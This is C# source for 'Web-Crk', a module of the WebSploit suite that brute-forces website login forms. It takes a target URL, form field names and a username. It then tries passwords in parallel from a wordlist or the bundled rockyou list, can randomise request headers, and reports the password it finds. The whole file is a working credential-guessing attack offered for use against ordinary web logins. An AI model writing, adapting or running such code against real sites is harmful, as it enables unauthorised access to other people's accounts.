/*
 *  Website Login Form Bruteforcing tool
 *
 *  Copyright (C) 2021 MishDotCom <mishdotcomdev@gmail.com>
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 2 of the License, or
 *  (at your option) any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program; if not, write to the Free Software
 *  Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301, USA
 *
 *  You must obey the GNU General Public License in all respects
 *  for all of the code used other than OpenSSL. *  If you modify
 *  file(s) with this exception, you may extend this exception to your
 *  version of the file(s), but you are not obligated to do so. *  If you
 *  do not wish to do so, delete this exception statement from your
 *  version. *  If you delete this exception statement from all source
 *  files in the program, then also delete it here.
 */

 using System;
 using System.Net;
 using System.Collections.Specialized;
 using System.Threading.Tasks;
 using System.Threading;
 using System.Linq;
 using System.Text;
 using System.IO;

 namespace WebSploit.WebCrk
 {
    class MainWebCracker
    {
        public static Headers headers = new Headers();
        static string target_host = "";
        static string target = "";
        public static void CommandParser(string command)
        {
            NameValueCollection formData;
            //----misc
            string form_pass = "";
            string form_user = "";
            bool randomUser = false;
            //--------

            string[] args = command.Split(' ');
            if(args.Length > 2)
            {
                if(isUrlValid(args[1]))
                {
                    target_host = args[1];
                    if(args.Length > 3)
                    {
                        string[] values = args[2].Split(',');
                        formData = new NameValueCollection();
                        foreach(string value in values)
                        {
                            string[] subValue = value.Split(':');
                            if(subValue.Length == 2)
                                formData.Add(subValue[0],subValue[1]);
                            else
                            {
                                string[] tagVar = value.Split(']');
                                if(tagVar.Length == 2)
                                {
                                    if(tagVar[0] == "[u")
                                    {
                                        string key = value.Remove(0,3);
                                        form_user = key;
                                        formData.Add(key, "user");
                                    }
                                    else if(tagVar[0] == "[p")
                                    {
                                        string key = value.Remove(0,3);
                                        form_pass = key;
                                        formData.Add(key, "pass");
                                    }
                                    else
                                    {
                                        string key = value.Remove(0,3);
                                        formData.Add(key, "");
                                    }
                                }
                                else
                                    formData.Add(value, "");
                            }
                        }
                        if(args.Length > 4)
                        {
                            target = args[3];
                            formData.Set(form_user, target);
                            if(args.Length >= 5)
                            {
                                if(args[4] == "-P")
                                {
                                    if(args.Length >= 6)
                                    {
                                        string path = args[5];
                                        if(File.Exists(path))
                                        {
                                            string[] passwords = File.ReadAllLines(path);
                                            bool verbose = false;
                                            if(args.Length >= 7)
                                            {
                                                if(args[6] == "-v")
                                                    verbose = true;
                                                else if(args[6] == "-r")
                                                {
                                                    randomUser = true;
                                                    if(args.Length == 8)
                                                        if(args[7] == "-v")
                                                            verbose = true;
                                                }
                                            }
                                            MainApp(formData, passwords, verbose, form_pass, randomUser);
                                        }
                                        else
                                            LogError($"Invalid syntax, File does not exist : {path}! Type '-webcrk -help' for command list.");
                                    }
                                    else
                                        LogError("Invalid syntax! Type '-webcrk -help' for command list.5");
                                }
                                else if(args[4] == "--p")
                                {
                                    string[] passwords = WebSploit.Properties.Resources.rockyou.Split('\n');
                                    bool verbose = false;
                                    if(args.Length >= 6)
                                    {
                                        if(args[5] == "-v")
                                            verbose = true;
                                        else if(args[5] == "-r")
                                        {
                                            randomUser = true;
                                            if(args.Length == 7)
                                                if(args[6] == "-v")
                                                    verbose = true;
                                        }
                                    }
                                    MainApp(formData, passwords, verbose, form_pass, randomUser);
                                    
                                }
                                else
                                    LogError($"Invalid syntax [{args[4]}]! Type '-webcrk -help' for command list.");
                            }
                            else
                                LogError("Invalid syntax! Type '-webcrk -help' for command list.4");
                        }
                        else
                            LogError("Invalid syntax! Type '-webcrk -help' for command list.3");
                    }
                    else
                        LogError("Invalid syntax! Type '-webcrk -help' for command list.2");
                }
                else
                    LogError($"Invalid URL [{args[1]}] detected.");
            }
            else
                LogError("Invalid syntax! Type '-webcrk -help' for command list.1");
        }
        public static void MainApp(NameValueCollection formdata, string[] passwords, bool verbose, string form_data_passkey, bool randomHeaders)
        {
            FirstRun(formdata, form_data_passkey);
            Thread.Sleep(1500);
            int counter = 0;
            SetupEnv(target_host, target);
            Parallel.ForEach(passwords, pass => {
                string _pass = pass.Trim();
                NameValueCollection formData_ = formdata;
                formData_.Set(form_data_passkey, _pass);
                CookieAwareWebClient client = new CookieAwareWebClient();
                bool loginResult = client.Login(target_host, formData_, verbose, randomHeaders);
                counter++;
                if(loginResult == true)
                {
                    Console.Write("\n[ ");
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.Write("PASSWORD FOUND");
                    Console.ForegroundColor = ConsoleColor.White;
                    Console.Write(" ] ");
                    Console.Write($"Password for login ");
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.Write($"{target} ");
                    Console.ForegroundColor = ConsoleColor.White;
                    Console.Write("found! Key = ");
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.Write($"{_pass}\n");
                    Console.ForegroundColor = ConsoleColor.White;
                    Console.WriteLine(">> Closing WebSploit/WebCrk...\n");
                    Environment.Exit(0);
                }
                else
                {
                    Console.WriteLine($"[ ATTEMPT ] Login attempt failed. Invalid password > {_pass}. [{counter}/{passwords.Length}]");
                }
            });
            Console.WriteLine("\n>> Password NOT found in dictionary!");
            Console.WriteLine(">> Closing WebSploit/WebCrk...");
        }
        public static void SetupEnv(string target_host, string target)
        {
            Console.Clear();
            Console.ForegroundColor = ConsoleColor.Blue;
            Console.WriteLine(Figgle.FiggleFonts.Standard.Render("Web-Crk"));
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("Web-Crk v1.0 © 2021 MishDotCom");
            Console.WriteLine("Part of the WebSploit suite.");
            Console.WriteLine("WebSploit > https://github.com/MishDotCom/WebSploit\n");
            Console.ForegroundColor = ConsoleColor.Yellow;
            Console.WriteLine($"[TARGET HOST] - {target_host}");
            Console.WriteLine($"[TARGER LOGIN] - {target}\n");
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine($"[ INFO ] : Begin bruteforce attack....\n");
            Console.ForegroundColor = ConsoleColor.White;
        }

        public static bool isUrlValid(string url)
        {
            return Uri.TryCreate(url, UriKind.Absolute, out Uri uriResult) 
                && (uriResult.Scheme == Uri.UriSchemeHttp || uriResult.Scheme == Uri.UriSchemeHttps);
        }

        public static void LogError(string err)
        {
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine($"[WebSploit/WebCrk/Error] > {err}");
            Console.ForegroundColor = ConsoleColor.White;
        }

        public static void FirstRun(NameValueCollection formdata, string form_data_passkey)
        {
            NameValueCollection nvc = formdata;
            nvc.Set(form_data_passkey, "m");
            CookieAwareWebClient client = new CookieAwareWebClient();
            client.FirstRunLogin(target_host, nvc);
        }
    }
}